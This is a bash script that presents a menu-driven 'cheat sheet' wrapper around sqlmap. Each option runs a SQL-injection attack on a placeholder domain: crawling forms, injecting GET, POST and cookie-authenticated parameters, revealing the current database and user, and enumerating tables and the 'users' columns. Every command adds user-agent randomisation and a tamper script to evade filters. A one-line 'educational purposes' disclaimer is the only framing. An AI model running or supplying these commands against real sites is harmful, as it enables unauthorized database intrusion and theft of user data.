#!/bin/bash
tput bold
BANNER1="\033[31m"
BANNER2="\033[1;32m"
MENU="\033[0;33m"
clear
main() {
echo -ne " ${BANNER2}
                                       |
                 ,------------=--------|___________|
-=============%%%|         |  |______|_|___________|  Inject SQL, Not Drugs :)
                 | | | | | | ||| | | | |___________|
                  ------------=--------|           |
                                       |
Credit For SQLmap Goes To Its Developers, Not Me. I Just Created The Cheet Sheat
##############################################################################################
  ██████   █████   ██▓     ███▄ ▄███▓▓█████  ███▄    █ ▄▄▄█████▓ ▒█████   ██▀███  
▒██    ▒ ▒██▓  ██▒▓██▒    ▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
░ ▓██▄   ▒██▒  ██░▒██░    ▓██    ▓██░▒███   ${BANNER1}▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
  ▒   ██▒░██  █▀ ░▒██░    ▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
▒██████▒▒░▒███▒█▄ ░██████▒▒██▒   ░██▒░▒████▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒ ${BANNER2}@psycolulz
${BANNER1}▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░░  ░      ░ ░ ░  ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░   ░▒ ░ ▒░  V. 1.0.4
░  ░  ░     ░   ░   ░ ░   ░      ░      ░      ░   ░ ░   ░      ░ ░ ░ ▒    ░░   ░ 
      ░      ░        ░  ░       ░      ░  ░         ░              ░ ░     ░     
##############################################################################################                                                                          
${MENU} https://github.com/psycolulz
 This Tool Is For Educational Purposes! Shoutout To The SQLmap Developers"
echo
PS3='root@sqlmentor~:'
options=("SQL Crawling" "SQL Crawling + Forms" "SQL GET Req." "SQL POST Req." "SQL Auth Site" "Collect DB & User" "Sql & Tables" "SQL User Columns" "SQL mssql DB" "SQL mysql DB" "SQL oracle DB" "SQL postgres DB" "Update Tool")
select opt in "${options[@]}"
do 
case $opt in
"SQL Crawling")
command clear
command sqlmap -u https://enterdomainhere.com/ --crawl=2 --random-agent --tamper=space2comment
;;
"SQL Crawling + Forms")
command clear
command sqlmap -u https://enterdomainhere.com/ --forms --crawl=2 --random-agent --tamper=space2comment
;;
"SQL GET Req.")
command clear
command sqlmap -u https://enterdomainhere.com/ --random-agent --tamper=space2comment
;;
"SQL POST Req.")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" --random-agent --tamper=space2comment
;;
"SQL Auth Site")
command clear
command  sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --cookie="cookie1=val1;cookie2=val2" --random-agent --tamper=space2comment
;;
"Collect DB & User")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --current-db --current-user --random-agent --tamper=space2comment
;;
"SQL & Tables")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --tables -D "testdb" --random-agent --tamper=space2comment
;;
"SQL User Columns")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --columns -T "users" --random-agent --tamper=space2comment
;;
"SQL mssql DB")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mssql" --random-agent --tamper=space2comment
;;
"SQL mysql DB")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mysql" --random-agent --tamper=space2comment
;;
"SQL oracle DB")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="oracle" --random-agent --tamper=space2comment
;; 
"SQL postgres DB")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="postgres" --random-agent --tamper=space2comment
;;
"Update Tool")
command clear
command git pull
command clear
echo
echo
echo " Tool Has Been Updated Successfully!!! "
echo
echo " ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣷⣶⣴⣾⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣤⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣄⠀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀
⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠈⢻⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⡿⠻⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿
⢈⣿⣿⣿⣿⣿⣿⣯⡀⠀⠈⠻⣿⣿⣿⠟⠁⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠈⠛⠁⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠉⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠛⠉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⠿⢿⡻⠿⣿⣿⣿⠟⠁⠀⠀⠀
"⠀
;;
esac
echo "Press Ctrl + C"
done
}
main

